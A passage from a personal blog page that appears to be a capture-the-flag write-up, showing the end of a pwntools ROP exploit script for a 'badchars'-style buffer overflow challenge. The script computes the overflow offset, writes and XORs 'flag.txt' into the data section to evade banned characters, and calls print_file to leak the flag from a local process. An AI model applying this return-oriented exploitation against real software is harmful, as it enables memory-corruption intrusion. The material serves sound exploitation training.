</span><span class="n">pattern</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">stack</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
<span class="c1"># cyclic find needs alphabet parameter so that banned characters aren't used.
</span><span class="n">offset</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">alphabet</span><span class="o">=</span><span class="s">'bcdefhijk'</span><span class="p">)</span>
<span class="n">info</span><span class="p">(</span><span class="s">"%r pattern (offset: %r)"</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span>

<span class="c1">##### CRAFTING PAYLOAD #####
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_r12_r13_r14_r15</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">flagtxtstr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">datasection</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">junkaddr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">junkaddr</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_qword_gadget</span><span class="p">)</span>

    
<span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">badchars</span><span class="p">:</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_r14_r15_gadget</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">char</span> <span class="o">==</span> <span class="s">'a'</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">datasection</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">char</span> <span class="o">==</span> <span class="s">'g'</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">datasection</span> <span class="o">+</span> <span class="mh">0x3</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">char</span> <span class="o">==</span> <span class="s">'.'</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">datasection</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">char</span> <span class="o">==</span> <span class="s">'x'</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">datasection</span> <span class="o">+</span> <span class="mh">0x6</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">xor_gadget</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_gadget</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">datasection</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">call_print_file</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="c1">##### SEND PAYLOAD AND GET FLAG #####
</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Thank you!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
<span class="c1">#Get our flag!
</span><span class="n">flag</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">success</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>

<span class="c1">##### END #####
</span></code></pre></div></div> </article> </div> </div> <footer class="fixed-bottom"> <div class="container mt-0"> © Copyright 2023 Parro . Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. Photos from <a href="https://unsplash.com" target="_blank" rel="external nofollow noopener">Unsplash</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js" integrity="sha256-fgLAgv7fyCGopR/gBNq2iW3ZKIdqIcyshnUULC4vex8=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js" integrity="sha256-EdPgYcPk/IIrw7FYeuJQexva49pVRZNmt3LculEr7zM=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js"></script> <script defer src="/assets/js/common.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>